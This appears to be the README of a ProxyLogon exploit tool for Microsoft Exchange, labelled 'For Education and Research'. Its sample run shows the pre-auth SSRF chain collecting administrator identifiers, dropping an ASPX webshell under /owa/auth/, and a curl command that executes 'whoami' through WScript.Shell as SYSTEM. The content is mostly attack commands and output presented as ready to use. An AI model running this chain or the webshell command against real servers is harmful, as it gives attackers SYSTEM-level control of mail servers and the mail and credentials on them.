# ProxyLogon Pre-Auth SSRF To Arbitrary File Write
For Education and Research
# Usage:
```
C:\>python proxylogon.py mail.evil.corp administratror@evil.corp
Attacking target mail.evil.corp
=============================
Got DN: /o=EVIL CORP/ou=first administrative group/cn=Recipients/cn=Administrator
Got SID: S-1-5-21-175943541-xxxxxxxxxx-3152120021-500
Got session id: a99eda32-xxxx-xxxx-825b-5f1c4a6080e7
Got canary: rOWUk7lmAUC2-5HIlQ4EpGq1rPu959xxxxxxxxxx_xxxxxxx_xxx_a-KJ5WR-9j95yu-JOv3dFY.
=========== It means good to go!!!====
Got OAB id: 2f3d4600-xxxx-xxxx-xxxx-b4a4c1d3fb58
Successful!
(+) Webshell drop at https://mail.evil.corp/owa/auth/evilcorp.aspx
(+) Enjoy your shell: curl -ik https://mail.evil.corp/owa/auth/evilcorp.aspx -d 'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())
CMD: whoami
nt authority\system
```
